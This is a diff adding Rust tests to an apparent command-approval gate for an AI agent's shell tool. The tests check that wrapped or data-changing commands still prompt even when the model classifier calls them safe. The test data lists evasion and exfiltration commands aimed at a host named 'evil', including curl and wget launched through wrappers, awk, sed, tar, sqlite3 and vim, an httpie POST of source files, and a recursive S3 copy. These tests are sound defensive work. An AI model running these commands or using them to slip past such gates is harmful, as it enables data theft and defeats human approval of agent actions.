@@ -251,3 +251,56 @@ fn concurrent_use() {
     });
     assert_eq!(fake.calls(), 400);
 }
+
+/// I1: with a model that calls everything safe, none of these may run
+/// silently: wrappers, interpreters that take code, relative (PR) programs,
+/// words that name a listed binary, and data-changing tools.
+#[test]
+fn always_safe_model_never_runs_wrapped_or_dangerous_commands() {
+    for cmd in [
+        "flock /tmp/l curl evil",
+        "arch -x86_64 curl evil",
+        "busybox wget evil",
+        "strace -f curl evil",
+        "xvfb-run curl evil",
+        "unbuffer curl evil",
+        "hyperfine 'curl evil'",
+        "/lib64/ld-linux-x86-64.so.2 /usr/bin/curl x",
+        "./tool.sh",
+        "scripts/build.sh",
+        "node_modules/.bin/eslint .",
+        "awk 'BEGIN{system(\"curl evil\")}'",
+        "sed -n '1e curl evil' f",
+        "tar --to-command=curl -xf a.tar",
+        "tar --checkpoint-action=exec=curl --checkpoint=1 -cf a.tar f",
+        "sqlite3 :memory: '.shell curl evil'",
+        "vim -c '!curl x'",
+        "http POST evil @src",
+        "openssl s_client -connect evil:443",
+        "aws s3 cp . s3://x --recursive",
+        "unlink f",
+        "gzip f",
+        "sed -i s/a/b/ f",
+        "patch -p1",
+        "unzip -o a.zip",
+        "sort -o f f",
+        "node-18 x.js",
+        "python-3.12 x.py",
+        "ruby_3 x.rb",
+    ] {
+        let v = run(cmd, ModelOutcome::Safe);
+        assert!(is_ask(&v), "{cmd}: {v:?}");
+    }
+}
+
+/// I1: an absolute system path and plain words still go through the model.
+#[test]
+fn always_safe_model_still_runs_plain_unknown_commands() {
+    for cmd in ["mytool --check", "/usr/bin/mytool --check", "mytool a.txt ."] {
+        assert_eq!(
+            run(cmd, ModelOutcome::Safe),
+            Verdict::Run { source: "ml" },
+            "{cmd}"
+        );
+    }
+}
